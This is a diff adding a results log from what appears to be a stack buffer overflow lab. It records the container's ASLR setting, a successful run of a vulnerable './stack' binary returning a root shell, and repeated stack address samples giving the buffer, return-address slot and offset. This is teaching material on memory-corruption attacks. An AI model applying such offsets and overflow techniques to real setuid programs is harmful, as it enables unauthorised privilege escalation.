@@ -1,0 +1,39 @@
+Kernel randomization setting inside the container:
+2
+
+Attack result without setarch -R:
+$ printf "id\nwhoami\nexit\n" | ./stack
+uid=0(root) gid=1000(seed) groups=1000(seed)
+root
+
+Observed address samples from repeated runs:
+str=0x40800b6f
+dummy=0x40800b50
+buffer=0x40800b1c
+ret_addr_slot=0x40800b3c
+offset=32
+---
+str=0x40800b6f
+dummy=0x40800b50
+buffer=0x40800b1c
+ret_addr_slot=0x40800b3c
+offset=32
+---
+str=0x40800b6f
+dummy=0x40800b50
+buffer=0x40800b1c
+ret_addr_slot=0x40800b3c
+offset=32
+---
+str=0x40800b6f
+dummy=0x40800b50
+buffer=0x40800b1c
+ret_addr_slot=0x40800b3c
+offset=32
+---
+str=0x40800b6f
+dummy=0x40800b50
+buffer=0x40800b1c
+ret_addr_slot=0x40800b3c
+offset=32
+---
